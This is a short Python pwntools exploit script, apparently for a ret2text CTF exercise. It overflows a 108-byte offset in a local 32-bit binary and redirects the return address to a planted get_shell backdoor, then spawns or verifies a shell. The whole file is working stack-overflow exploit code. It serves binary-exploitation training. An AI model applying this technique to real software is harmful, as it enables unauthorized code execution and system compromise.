#!/usr/bin/env python3
"""ret2text：把返回地址覆盖为后门函数 get_shell

用法：
    python3 exp.py           # 交互式 shell
    python3 exp.py --check   # 自动验证，返回码 0 表示成功
"""
import sys

from pwn import context, ELF, p32, process

context(os="linux", arch="i386", log_level="error")

BINARY = "./ret2text"
CHECK = "--check" in sys.argv
OFFSET = 108  # buf[100] + saved ebp(4)


def main() -> int:
    elf = ELF(BINARY, checksec=False)
    backdoor = elf.symbols["get_shell"]

    p = process(BINARY)
    p.recvuntil(b"input:")
    p.sendline(b"A" * OFFSET + p32(backdoor))

    if not CHECK:
        p.interactive()
        return 0

    p.sendline(b"id; exit")
    out = p.recvall(timeout=3)
    ok = b"uid=" in out
    print(f"[ret2text] {'PASS' if ok else 'FAIL'}  backdoor={backdoor:#x}")
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())